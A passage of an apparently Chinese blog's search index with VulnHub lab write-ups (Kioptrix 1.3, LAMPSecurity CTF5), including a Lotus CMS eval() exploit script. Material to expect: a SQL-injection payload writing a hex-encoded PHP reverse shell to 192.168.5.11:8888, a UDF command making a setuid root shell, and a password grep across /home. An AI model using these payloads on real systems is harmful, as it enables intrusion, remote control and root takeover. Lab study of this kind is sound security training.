payload = \u0026#34;index\u0026#39;);${system(\u0026#39;\u0026#34;+command+\u0026#34;\u0026#39;)};#\u0026#34;\r\n        r = requests.post(loginurl,headers={\u0026#39;Content-Type\u0026#39;: \u0026#39;application/x-www-form-urlencoded\u0026#39;},data={\u0026#39;page\u0026#39;: payload})\r\n        text = r.text\r\n        t = text.split(\u0026#34;\u0026lt;/html\u0026gt;\u0026#34;)\r\n        print(t[1])\r\n\r\n\r\ndef Verify(URL):\r\n    r = requests.get(URL,allow_redirects=False)\r\n    if r.status_code != 200:\r\n        print(\u0026#34;Url is not valid\u0026#34;)\r\n        exit(0)\r\n\r\ntry:\r\n    print(\u0026#34;\\t--------------------------------------------------------------\u0026#34;)\r\n    print(\u0026#34;\\t|        Lotus CMS 3.0 eval() Remote Command Execition       |\u0026#34;)\r\n    print(\u0026#34;\\t--------------------------------------------------------------\u0026#34;)\r\n    print(\u0026#34;\\t| Reference : http://secunia.com/secunia_research/2011-21/   |\u0026#34;)\r\n    print(\u0026#34;\\t| By        : Vaibhav Joshi                                  |\u0026#34;)\r\n    print(\u0026#34;\\t--------------------------------------------------------------\u0026#34;)\r\n    if len(sys.argv) \u0026lt; 3:\r\n        print(\u0026#34;\\t| Usage     : %s \u0026lt;IP\u0026gt; \u0026lt;PORT\u0026gt;                            |\u0026#34; % sys.argv[0])\r\n        print(\u0026#34;\\t--------------------------------------------------------------\u0026#34;)\r\n        sys.exit()\r\n    host = sys.argv[1]\r\n    port = sys.argv[2]\r\n    loc = raw_input(\u0026#34;Enter Home page URI of CMS (Default /): \u0026#34;)\r\n    if loc == \u0026#34;\u0026#34;:\r\n        loc = \u0026#34;/\u0026#34;\r\n    URL = \u0026#34;http://\u0026#34; + host + \u0026#34;:\u0026#34; + port + loc\r\n    Verify(URL)\r\n    execute(URL)\r\n\r\nexcept Exception as error:\r\n    print \u0026#39;Caught this error: \u0026#39; + repr(error)\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE965e967ef8d2aab44edd44912a6ce454%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x028 Kioptrix Level 1.2"},{"content":"这个机器需要新建虚拟机，然后从磁盘加载，然后保存现有格式即可：\n端口扫描 渗透 疑似线索：\nsql注入：\n居然能直接\u0026ndash;os-shell，靶场里面很少见啊：\n提权 首先我反弹shell，这里我详细看了一下，出现了一个问题，这里的sqlmap直接getshell了，但是很明显的是，我目前对当前目录是没有写入权限的，同时刚刚上面sqlmap的告警也告诉了我们这件事：\n然后是sqlmap的小马拉大马中的小马是肯定成功上传了的，那么答案就比较明显了，mysql是具备写入权限的，但是apache不具备:\n解决方案就比较简单了，通过sql注入直接写反弹shell的脚本即可，具体操作方法通过sqlmap代理到bp，抓包，修复第一个上传小马的包即可：\npayload如下：\nmyusername=john\u0026amp;mypassword=-7572%27%20OR%201681=1681%20LIMIT%200,1%20INTO%20OUTFILE%20%27%2fvar%2fwww%2fcxk1.php%27%20LINES%20TERMINATED%20BY%20%0A0x20203c3f7068700a20202f2f207068702d726576657273652d7368656c6c202d20412052657665727365205368656c6c20696d706c656d656e746174696f6e20696e205048500a20202f2f20436f707972696768742028432920323030372070656e746573746d6f6e6b65794070656e746573746d6f6e6b65792e6e65740a0a20207365745f74696d655f6c696d6974202830293b0a20202456455253494f4e203d2022312e30223b0a2020246970203d20273139322e3136382e352e3131273b20202f2f20596f752068617665206368616e67656420746869730a202024706f7274203d20383838383b20202f2f20416e6420746869730a2020246368756e6b5f73697a65203d20313430303b0a20202477726974655f61203d206e756c6c3b0a2020246572726f725f61203d206e756c6c3b0a2020247368656c6c203d2027756e616d65202d613b20773b2069643b202f62696e2f7368202d69273b0a2020246461656d6f6e203d20303b0a2020246465627567203d20303b0a0a20202f2f0a20202f2f204461656d6f6e697365206f757273656c6620696620706f737369626c6520746f2061766f6964207a6f6d62696573206c617465720a20202f2f0a0a20202f2f2070636e746c5f666f726b20697320686172646c79206576657220617661696c61626c652c206275742077696c6c20616c6c6f7720757320746f206461656d6f6e6973650a20202f2f206f7572207068702070726f6365737320616e642061766f6964207a6f6d626965732e2020576f7274682061207472792e2e2e0a20206966202866756e6374696f6e5f657869737473282770636e746c5f666f726b272929207b0a202020202f2f20466f726b20616e6420686176652074686520706172656e742070726f6365737320657869740a2020202024706964203d2070636e746c5f666f726b28293b0a202020200a202020206966202824706964203d3d202d3129207b0a2020202020207072696e74697428224552524f523a2043616e277420666f726b22293b0a202020202020657869742831293b0a202020207d0a202020200a20202020696620282470696429207b0a202020202020657869742830293b20202f2f20506172656e742065786974730a202020207d0a0a202020202f2f204d616b65207468652063757272656e742070726f6365737320612073657373696f6e206c65616465720a202020202f2f2057696c6c206f6e6c79207375636365656420696620776520666f726b65640a2020202069662028706f7369785f7365747369642829203d3d202d3129207b0a2020202020207072696e74697428224572726f723a2043616e277420736574736964282922293b0a202020202020657869742831293b0a202020207d0a0a20202020246461656d6f6e203d20313b0a20207d20656c7365207b0a202020207072696e74697428225741524e494e473a204661696c656420746f206461656d6f6e6973652e20205468697320697320717569746520636f6d6d6f6e20616e64206e6f7420666174616c2e22293b0a20207d0a0a20202f2f204368616e676520746f20612073616665206469726563746f72790a2020636864697228222f22293b0a0a20202f2f2052656d6f766520616e7920756d61736b20776520696e686572697465640a2020756d61736b2830293b0a0a20202f2f0a20202f2f20446f207468652072657665727365207368656c6c2e2e2e0a20202f2f0a0a20202f2f204f70656e207265766572736520636f6e6e656374696f6e0a202024736f636b203d2066736f636b6f70656e282469702c2024706f72742c20246572726e6f2c20246572727374722c203330293b0a2020696620282124736f636b29207b0a202020207072696e7469742822246572727374722028246572726e6f2922293b0a20202020657869742831293b0a20207d0a0a20202f2f20537061776e207368656c6c2070726f636573730a20202464657363726970746f7273706563203d206172726179280a2020202030203d3e206172726179282270697065222c20227222292c20202f2f20737464696e20697320612070697065207468617420746865206368696c642077696c6c20726561642066726f6d0a2020202031203d3e206172726179282270697065222c20227722292c20202f2f207374646f757420697320612070697065207468617420746865206368696c642077696c6c20777269746520746f0a2020202032203d3e206172726179282270697065222c20227722292020202f2f2073746465727220697320612070697065207468617420746865206368696c642077696c6c20777269746520746f0a2020293b0a0a20202470726f63657373203d2070726f635f6f70656e28247368656c6c2c202464657363726970746f72737065632c20247069706573293b0a0a2020696620282169735f7265736f75726365282470726f636573732929207b0a202020207072696e74697428224552524f523a2043616e277420737061776e207368656c6c22293b0a20202020657869742831293b0a20207d0a0a20202f2f205365742065766572797468696e6720746f206e6f6e2d626c6f636b696e670a20202f2f20526561736f6e3a204f636373696f6e616c6c792072656164732077696c6c20626c6f636b2c206576656e2074686f7567682073747265616d5f73656c6563742074656c6c73207573207468657920776f6e27740a202073747265616d5f7365745f626c6f636b696e67282470697065735b305d2c2030293b0a202073747265616d5f7365745f626c6f636b696e67282470697065735b315d2c2030293b0a202073747265616d5f7365745f626c6f636b696e67282470697065735b325d2c2030293b0a202073747265616d5f7365745f626c6f636b696e672824736f636b2c2030293b0a0a20207072696e74697428225375636365737366756c6c79206f70656e65642072657665727365207368656c6c20746f202469703a24706f727422293b0a0a20207768696c6520283129207b0a202020202f2f20436865636b20666f7220656e64206f662054435020636f6e6e656374696f6e0a202020206966202866656f662824736f636b2929207b0a2020202020207072696e74697428224552524f523a205368656c6c20636f6e6e656374696f6e207465726d696e6174656422293b0a202020202020627265616b3b0a202020207d0a0a202020202f2f20436865636b20666f7220656e64206f66205354444f55540a202020206966202866656f66282470697065735b315d2929207b0a2020202020207072696e74697428224552524f523a205368656c6c2070726f63657373207465726d696e6174656422293b0a202020202020627265616b3b0a202020207d0a0a202020202f2f205761697420756e74696c206120636f6d6d616e6420697320656e6420646f776e2024736f636b2c206f7220736f6d650a202020202f2f20636f6d6d616e64206f757470757420697320617661696c61626c65206f6e205354444f5554206f72205354444552520a2020202024726561645f61203d2061727261792824736f636b2c202470697065735b315d2c202470697065735b325d293b0a20202020246e756d5f6368616e6765645f736f636b657473203d2073747265616d5f73656c6563742824726561645f612c202477726974655f612c20246572726f725f612c206e756c6c293b0a0a202020202f2f2049662077652063616e20726561642066726f6d207468652054435020736f636b65742c2073656e640a202020202f2f206461746120746f2070726f63657373277320535444494e0a2020202069662028696e5f61727261792824736f636b2c2024726561645f612929207b0a2020202020206966202824646562756729207072696e7469742822534f434b205245414422293b0a20202020202024696e707574203d2066726561642824736f636b2c20246368756e6b5f73697a65293b0a2020202020206966202824646562756729207072696e7469742822534f434b3a2024696e70757422293b0a202020202020667772697465282470697065735b305d2c2024696e707574293b0a202020207d0a0a202020202f2f2049662077652063616e20726561642066726f6d207468652070726f636573732773205354444f55540a202020202f2f2073656e64206461746120646f776e2074637020636f6e6e656374696f6e0a2020202069662028696e5f6172726179282470697065735b315d2c2024726561645f612929207b0a2020202020206966202824646562756729207072696e74697428225354444f5554205245414422293b0a20202020202024696e707574203d206672656164282470697065735b315d2c20246368756e6b5f73697a65293b0a2020202020206966202824646562756729207072696e74697428225354444f55543a2024696e70757422293b0a2020202020206677726974652824736f636b2c2024696e707574293b0a202020207d0a0a202020202f2f2049662077652063616e20726561642066726f6d207468652070726f636573732773205354444552520a202020202f2f2073656e64206461746120646f776e2074637020636f6e6e656374696f6e0a2020202069662028696e5f6172726179282470697065735b325d2c2024726561645f612929207b0a2020202020206966202824646562756729207072696e7469742822535444455252205245414422293b0a20202020202024696e707574203d206672656164282470697065735b325d2c20246368756e6b5f73697a65293b0a2020202020206966202824646562756729207072696e74697428225354444552523a2024696e70757422293b0a2020202020206677726974652824736f636b2c2024696e707574293b0a202020207d0a20207d0a0a202066636c6f73652824736f636b293b0a202066636c6f7365282470697065735b305d293b0a202066636c6f7365282470697065735b315d293b0a202066636c6f7365282470697065735b325d293b0a202070726f635f636c6f7365282470726f63657373293b0a0a20202f2f204c696b65207072696e742c2062757420646f6573206e6f7468696e67206966207765277665206461656d6f6e69736564206f757273656c660a20202f2f2028492063616e277420666967757265206f757420686f7720746f207265646972656374205354444f5554206c696b6520612070726f706572206461656d6f6e290a202066756e6374696f6e207072696e746974202824737472696e6729207b0a202020206966202821246461656d6f6e29207b0a2020202020207072696e74202224737472696e670a223b0a202020207d0a20207d0a0a20203f3e20%0A--%20-\u0026amp;Submit=Login 这里的payload是url全部+\n然后就成功上传反弹shell脚本：\n数据库内容翻一下，切换到用户里面去\n切换过去后，就发现了命令行不对劲，看了一下passwd，果然不对劲，然后执行几次后还要被提出去：\n然后就是kshell切换到bash可以使用\necho os.system(\u0026#39;/bin/bash\u0026#39;) 发现疑似提权点，后面发现不行：\n然后就是wget命令不让用，邪门儿：\n最后，猪脑过载了，没找到提权方式，看了WP，是UDF提权，完全没往这个方向思考（\n本身就存在udf提权文件，这里免去了文件上传的问题，但是理论上前面的上传方式应该可以使用：\nselect sys_exec(\u0026#39;cp /bin/sh /tmp/; chown root:root /tmp/sh; chmod +s /tmp/sh\u0026#39;); 后面再次抓包分析sqlmap的数据包解答了我的疑惑，sqlmap不是单独的小马拉大马，而是先尝试进行小马拉大马，如果不行，就再次尝试使用mysql语句写入，\n其实看文件属性也可以知道，但是主要是想要求证一下：\n总结 sql注入后利用的靶场\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x029-kioptrix-level-1.3/","summary":"\u003cp\u003e这个机器需要新建虚拟机，然后从磁盘加载，然后保存现有格式即可：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEf07f618ea1b834fa7abeb124fc8a04ae%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEadcc3dbc1c83aeb6839e00969e6bd396%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE878aace2dd96a7d0d5956226edf1d25f%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透\"\u003e渗透\u003c/h1\u003e\n\u003cp\u003e疑似线索：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE5222b2d6fd7e353a4d0c1b7eb00747a5%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003esql注入：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE84f361280f37a9b1dd5157674e583fc6%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e居然能直接\u0026ndash;os-shell，靶场里面很少见啊：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE776cf2fb28db25398cf0781432ade1af%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e首先我反弹shell，这里我详细看了一下，出现了一个问题，这里的sqlmap直接getshell了，但是很明显的是，我目前对当前目录是没有写入权限的，同时刚刚上面sqlmap的告警也告诉了我们这件事：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE9f09b8c6d4f4014f9397c35f3c0b0634%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e然后是sqlmap的小马拉大马中的小马是肯定成功上传了的，那么答案就比较明显了，mysql是具备写入权限的，但是apache不具备:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE5757be8cde328d41545710f88bb6c0a7%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e解决方案就比较简单了，通过sql注入直接写反弹shell的脚本即可，具体操作方法通过sqlmap代理到bp，抓包，修复第一个上传小马的包即可：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEd9d1c58ed8ba99db61b43bd001507db5%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003epayload如下：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003emyusername=john\u0026amp;mypassword=-7572%27%20OR%201681=1681%20LIMIT%200,1%20INTO%20OUTFILE%20%27%2fvar%2fwww%2fcxk1.php%27%20LINES%20TERMINATED%20BY%20%0A0x20203c3f7068700a20202f2f207068702d726576657273652d7368656c6c202d20412052657665727365205368656c6c20696d706c656d656e746174696f6e20696e205048500a20202f2f20436f707972696768742028432920323030372070656e746573746d6f6e6b65794070656e746573746d6f6e6b65792e6e65740a0a20207365745f74696d655f6c696d6974202830293b0a20202456455253494f4e203d2022312e30223b0a2020246970203d20273139322e3136382e352e3131273b20202f2f20596f752068617665206368616e67656420746869730a202024706f7274203d20383838383b20202f2f20416e6420746869730a2020246368756e6b5f73697a65203d20313430303b0a20202477726974655f61203d206e756c6c3b0a2020246572726f725f61203d206e756c6c3b0a2020247368656c6c203d2027756e616d65202d613b20773b2069643b202f62696e2f7368202d69273b0a2020246461656d6f6e203d20303b0a2020246465627567203d20303b0a0a20202f2f0a20202f2f204461656d6f6e697365206f757273656c6620696620706f737369626c6520746f2061766f6964207a6f6d62696573206c617465720a20202f2f0a0a20202f2f2070636e746c5f666f726b20697320686172646c79206576657220617661696c61626c652c206275742077696c6c20616c6c6f7720757320746f206461656d6f6e6973650a20202f2f206f7572207068702070726f6365737320616e642061766f6964207a6f6d626965732e2020576f7274682061207472792e2e2e0a20206966202866756e6374696f6e5f657869737473282770636e746c5f666f726b272929207b0a202020202f2f20466f726b20616e6420686176652074686520706172656e742070726f6365737320657869740a2020202024706964203d2070636e746c5f666f726b28293b0a202020200a202020206966202824706964203d3d202d3129207b0a2020202020207072696e74697428224552524f523a2043616e277420666f726b22293b0a202020202020657869742831293b0a202020207d0a202020200a20202020696620282470696429207b0a202020202020657869742830293b20202f2f20506172656e742065786974730a202020207d0a0a202020202f2f204d616b65207468652063757272656e742070726f6365737320612073657373696f6e206c65616465720a202020202f2f2057696c6c206f6e6c79207375636365656420696620776520666f726b65640a2020202069662028706f7369785f7365747369642829203d3d202d3129207b0a2020202020207072696e74697428224572726f723a2043616e277420736574736964282922293b0a202020202020657869742831293b0a202020207d0a0a20202020246461656d6f6e203d20313b0a20207d20656c7365207b0a202020207072696e74697428225741524e494e473a204661696c656420746f206461656d6f6e6973652e20205468697320697320717569746520636f6d6d6f6e20616e64206e6f7420666174616c2e22293b0a20207d0a0a20202f2f204368616e676520746f20612073616665206469726563746f72790a2020636864697228222f22293b0a0a20202f2f2052656d6f766520616e7920756d61736b20776520696e686572697465640a2020756d61736b2830293b0a0a20202f2f0a20202f2f20446f207468652072657665727365207368656c6c2e2e2e0a20202f2f0a0a20202f2f204f70656e207265766572736520636f6e6e656374696f6e0a202024736f636b203d2066736f636b6f70656e282469702c2024706f72742c20246572726e6f2c20246572727374722c203330293b0a2020696620282124736f636b29207b0a202020207072696e7469742822246572727374722028246572726e6f2922293b0a20202020657869742831293b0a20207d0a0a20202f2f20537061776e207368656c6c2070726f636573730a20202464657363726970746f7273706563203d206172726179280a2020202030203d3e206172726179282270697065222c20227222292c20202f2f20737464696e20697320612070697065207468617420746865206368696c642077696c6c20726561642066726f6d0a2020202031203d3e206172726179282270697065222c20227722292c20202f2f207374646f757420697320612070697065207468617420746865206368696c642077696c6c20777269746520746f0a2020202032203d3e206172726179282270697065222c20227722292020202f2f2073746465727220697320612070697065207468617420746865206368696c642077696c6c20777269746520746f0a2020293b0a0a20202470726f63657373203d2070726f635f6f70656e28247368656c6c2c202464657363726970746f72737065632c20247069706573293b0a0a2020696620282169735f7265736f75726365282470726f636573732929207b0a202020207072696e74697428224552524f523a2043616e277420737061776e207368656c6c22293b0a20202020657869742831293b0a20207d0a0a20202f2f205365742065766572797468696e6720746f206e6f6e2d626c6f636b696e670a20202f2f20526561736f6e3a204f636373696f6e616c6c792072656164732077696c6c20626c6f636b2c206576656e2074686f7567682073747265616d5f73656c6563742074656c6c73207573207468657920776f6e27740a202073747265616d5f7365745f626c6f636b696e67282470697065735b305d2c2030293b0a202073747265616d5f7365745f626c6f636b696e67282470697065735b315d2c2030293b0a202073747265616d5f7365745f626c6f636b696e67282470697065735b325d2c2030293b0a202073747265616d5f7365745f626c6f636b696e672824736f636b2c2030293b0a0a20207072696e74697428225375636365737366756c6c79206f70656e65642072657665727365207368656c6c20746f202469703a24706f727422293b0a0a20207768696c6520283129207b0a202020202f2f20436865636b20666f7220656e64206f662054435020636f6e6e656374696f6e0a202020206966202866656f662824736f636b2929207b0a2020202020207072696e74697428224552524f523a205368656c6c20636f6e6e656374696f6e207465726d696e6174656422293b0a202020202020627265616b3b0a202020207d0a0a202020202f2f20436865636b20666f7220656e64206f66205354444f55540a202020206966202866656f66282470697065735b315d2929207b0a2020202020207072696e74697428224552524f523a205368656c6c2070726f63657373207465726d696e6174656422293b0a202020202020627265616b3b0a202020207d0a0a202020202f2f205761697420756e74696c206120636f6d6d616e6420697320656e6420646f776e2024736f636b2c206f7220736f6d650a202020202f2f20636f6d6d616e64206f757470757420697320617661696c61626c65206f6e205354444f5554206f72205354444552520a2020202024726561645f61203d2061727261792824736f636b2c202470697065735b315d2c202470697065735b325d293b0a20202020246e756d5f6368616e6765645f736f636b657473203d2073747265616d5f73656c6563742824726561645f612c202477726974655f612c20246572726f725f612c206e756c6c293b0a0a202020202f2f2049662077652063616e20726561642066726f6d207468652054435020736f636b65742c2073656e640a202020202f2f206461746120746f2070726f63657373277320535444494e0a2020202069662028696e5f61727261792824736f636b2c2024726561645f612929207b0a2020202020206966202824646562756729207072696e7469742822534f434b205245414422293b0a20202020202024696e707574203d2066726561642824736f636b2c20246368756e6b5f73697a65293b0a2020202020206966202824646562756729207072696e7469742822534f434b3a2024696e70757422293b0a202020202020667772697465282470697065735b305d2c2024696e707574293b0a202020207d0a0a202020202f2f2049662077652063616e20726561642066726f6d207468652070726f636573732773205354444f55540a202020202f2f2073656e64206461746120646f776e2074637020636f6e6e656374696f6e0a2020202069662028696e5f6172726179282470697065735b315d2c2024726561645f612929207b0a2020202020206966202824646562756729207072696e74697428225354444f5554205245414422293b0a20202020202024696e707574203d206672656164282470697065735b315d2c20246368756e6b5f73697a65293b0a2020202020206966202824646562756729207072696e74697428225354444f55543a2024696e70757422293b0a2020202020206677726974652824736f636b2c2024696e707574293b0a202020207d0a0a202020202f2f2049662077652063616e20726561642066726f6d207468652070726f636573732773205354444552520a202020202f2f2073656e64206461746120646f776e2074637020636f6e6e656374696f6e0a2020202069662028696e5f6172726179282470697065735b325d2c2024726561645f612929207b0a2020202020206966202824646562756729207072696e7469742822535444455252205245414422293b0a20202020202024696e707574203d206672656164282470697065735b325d2c20246368756e6b5f73697a65293b0a2020202020206966202824646562756729207072696e74697428225354444552523a2024696e70757422293b0a2020202020206677726974652824736f636b2c2024696e707574293b0a202020207d0a20207d0a0a202066636c6f73652824736f636b293b0a202066636c6f7365282470697065735b305d293b0a202066636c6f7365282470697065735b315d293b0a202066636c6f7365282470697065735b325d293b0a202070726f635f636c6f7365282470726f63657373293b0a0a20202f2f204c696b65207072696e742c2062757420646f6573206e6f7468696e67206966207765277665206461656d6f6e69736564206f757273656c660a20202f2f2028492063616e277420666967757265206f757420686f7720746f207265646972656374205354444f5554206c696b6520612070726f706572206461656d6f6e290a202066756e6374696f6e207072696e746974202824737472696e6729207b0a202020206966202821246461656d6f6e29207b0a2020202020207072696e74202224737472696e670a223b0a202020207d0a20207d0a0a20203f3e20%0A--%20-\u0026amp;Submit=Login\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这里的payload是url全部+\u003c/p\u003e\n\u003cp\u003e然后就成功上传反弹shell脚本：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE54a5081078ef0558a6206063821d8a90%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e数据库内容翻一下，切换到用户里面去\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE922177532bf3246c6f786e4dab1c35c3%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e切换过去后，就发现了命令行不对劲，看了一下passwd，果然不对劲，然后执行几次后还要被提出去：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE6962f5d2eceeadbe873dd902b266bf24%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e然后就是kshell切换到bash可以使用\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eecho os.system(\u0026#39;/bin/bash\u0026#39;)\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE6cd23af6a93e70e9ed83f945158a3e86%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e发现疑似提权点，后面发现不行：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEf27a330ca5d6947ece2525c0a7fdd689%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e然后就是wget命令不让用，邪门儿：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE759604e012693e01e1859cc2a976f534%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e最后，猪脑过载了，没找到提权方式，看了WP，是UDF提权，完全没往这个方向思考（\u003c/p\u003e\n\u003cp\u003e本身就存在udf提权文件，这里免去了文件上传的问题，但是理论上前面的上传方式应该可以使用：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-text\" data-lang=\"text\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eselect sys_exec(\u0026#39;cp /bin/sh /tmp/; chown root:root /tmp/sh; chmod +s /tmp/sh\u0026#39;);\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE04abce5874af72cadbf320aa802b5e59%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e后面再次抓包分析sqlmap的数据包解答了我的疑惑，sqlmap不是单独的小马拉大马，而是先尝试进行小马拉大马，如果不行，就再次尝试使用mysql语句写入，\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE45f579ee4a1d5c70e5135d8a6062503d%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e其实看文件属性也可以知道，但是主要是想要求证一下：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE8f22bd492e68db679e35fa6e97871383%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"总结\"\u003e总结\u003c/h1\u003e\n\u003cp\u003esql注入后利用的靶场\u003c/p\u003e","title":"0x029 Kioptrix Level 1.3"},{"content":"端口扫描 渗透 smb\\mysql渗透无果，看来突破口还是在80端口上：\n很难受，大致逛了一圈后，基本思路是OK的，看到了NanoCMS的RCE，但是需要认证，然后是SquirrelMail的历史漏洞，那个版本的打完了，没有能用的，后面想办法获取凭证无果，无奈看WP，只能说，棋差一招：\nhttps://packetstormsecurity.com/files/76642/Security-Evaluation-Of-NanoCMS.html\n其中有信息提到，NanoCMS存在信息泄露：\n到最后也没用上脚本：\n添加一个页面：\n然后访问即可：\n提权： 提权使用常规思维又是卡了很久，但是卡住的时候往往答案很简单，信息检索就行，使用linpeas.sh并没有帮我提取出来需要的内容，只能手动查找：\n查找pass关键词i文件：\ngrep -R -i pass /home/* 2\u0026gt;/dev/null 没有flag\n总结 感觉是有点体力活儿的意思，不太好搞\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x030-lampsecurity-ctf5/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE08f99b02faa408bc8c2e03f9d9677446%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEbc1513a46c402a3d395a06065c4edbd2%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透\"\u003e渗透\u003c/h1\u003e\n\u003cp\u003esmb\\mysql渗透无果，看来突破口还是在80端口上：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEed67ef867d263248b51fb46cd677fdb7%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e很难受，大致逛了一圈后，基本思路是OK的，看到了NanoCMS的RCE，但是需要认证，然后是SquirrelMail的历史漏洞，那个版本的打完了，没有能用的，后面想办法获取凭证无果，无奈看WP，只能说，棋差一招：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE5fcb3b6f55457caa801742765ba1fdbf%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://packetstormsecurity.com/files/76642/Security-Evaluation-Of-NanoCMS.html\"\u003ehttps://packetstormsecurity.com/files/76642/Security-Evaluation-Of-NanoCMS.html\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e其中有信息提到，NanoCMS存在信息泄露：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE42fcd10e2bf1a7ebc414e678856a71a4%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEb44c5e672a8125f23ee311c60276797b%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE17914a647dde3cc1acd11e0161106266%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e到最后也没用上脚本：\u003c/p\u003e\n\u003cp\u003e添加一个页面：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" 